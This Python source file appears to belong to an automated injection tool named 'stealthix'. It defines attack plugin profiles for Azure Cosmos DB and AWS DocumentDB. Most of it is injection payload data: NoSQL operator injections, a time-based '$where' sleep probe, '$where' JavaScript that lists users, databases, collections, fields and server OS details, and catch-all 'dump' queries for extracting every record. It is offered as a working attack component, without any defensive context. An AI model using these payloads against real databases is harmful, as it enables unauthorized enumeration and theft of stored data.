from __future__ import annotations

from stealthix.plugins.base import Plugin

MULTIMODEL_PLUGINS = [
    Plugin(
        "cosmosdb",
        "nosql",
        dbms="cosmosdb",
        payloads=['SELECT * FROM c WHERE c.field = "1"', "SELECT * FROM c WHERE 1=1"],
        fingerprints=["cosmosdb", "azure"],
        error_signatures=["cosmosdb", "azure", "syntax error"],
        version_queries=['SELECT * FROM c WHERE c.id = "version"', "SELECT * FROM c"],
        privilege_checks=[
            'SELECT * FROM c WHERE c.type = "user"',
            'SELECT * FROM c WHERE c.type = "role"',
        ],
        os_queries=['SELECT * FROM c WHERE c.type = "system"'],
        preferred_techniques="BETU",
        extraction_profiles={
            "databases": {
                "payloads": ['SELECT * FROM c WHERE c.type = "database"', "SELECT * FROM c"],
                "patterns": [r"\bdatabase[:=\s]+([a-z0-9_\-]+)", r"\bdb[:=\s]+([a-z0-9_\-]+)"],
            },
            "tables": {
                "payloads": ['SELECT * FROM c WHERE c.type = "container"', "SELECT * FROM c"],
                "patterns": [r"\bcontainer[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": ["SELECT * FROM c LIMIT 1", "SELECT * FROM c"],
                "patterns": [r"\bfield[:=\s]+([a-z0-9_\-]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": ["SELECT * FROM c WHERE 1=1", "SELECT * FROM c"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
    Plugin(
        "documentdb",
        "nosql",
        dbms="documentdb",
        payloads=['{"$ne": null}', '{"$where": "sleep(3000)"}'],
        fingerprints=["documentdb", "aws"],
        error_signatures=["documentdb", "aws", "mongodb"],
        version_queries=[
            '{"$where":"return db.version()"}',
            '{"$where":"return db.getMongo().version()"}',
        ],
        privilege_checks=[
            '{"$where":"return db.getUsers()"}',
            '{"$where":"return db.getCollectionNames()"}',
        ],
        os_queries=['{"$where":"return db.serverStatus().os"}'],
        preferred_techniques="BET",
        extraction_profiles={
            "databases": {
                "payloads": [
                    '{"$where":"return db.getMongo().getDBNames().join(",")"}',
                    '{"$where":"return db.getName()"}',
                ],
                "patterns": [r"\bdatabase[:=\s]+([a-z0-9_\-]+)", r"\bdb[:=\s]+([a-z0-9_\-]+)"],
            },
            "tables": {
                "payloads": [
                    '{"$where":"return db.getCollectionNames().join(",")"}',
                    '{"$aggregate": [{"$listCollections": {}}]}',
                ],
                "patterns": [r"\bcollection[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": [
                    '{"$where":"return Object.keys(this).join(",")"}',
                    '{"$project": {"keys": {"$objectToArray": "$$ROOT"}}}',
                ],
                "patterns": [r"\bfield[:=\s]+([a-z0-9_\-]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": ['{"$where":"return true"}', '{"$regex":".*"}', '{"$ne":null}'],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
]

__all__ = ["MULTIMODEL_PLUGINS"]
